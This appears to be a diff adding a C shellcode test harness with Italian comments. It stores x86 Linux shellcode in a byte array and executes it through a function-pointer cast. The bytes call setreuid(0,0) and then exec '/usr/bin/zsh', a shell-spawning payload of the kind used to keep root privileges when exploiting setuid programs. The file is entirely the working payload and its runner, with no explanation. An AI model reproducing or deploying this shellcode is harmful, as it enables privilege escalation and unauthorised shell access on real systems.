@@ -1,0 +1,21 @@
+#include <stdio.h>
+#include <unistd.h>
+
+unsigned char buf[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x0b"
+"\x31\xd2\x31\xc9\x52\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69"
+"\x6e\x68\x2f\x75\x73\x72\x89\xe3\xcd\x80\x31\xc0\xb0\x01"
+"\x31\xdb\xcd\x80";
+
+
+int main() {
+    
+    //flush forzato
+    fflush(stdout);
+    fflush(stderr);
+    
+    //esegui
+    int (*func)() = (int(*)())buf;
+    func();
+    
+    return 0;
+}
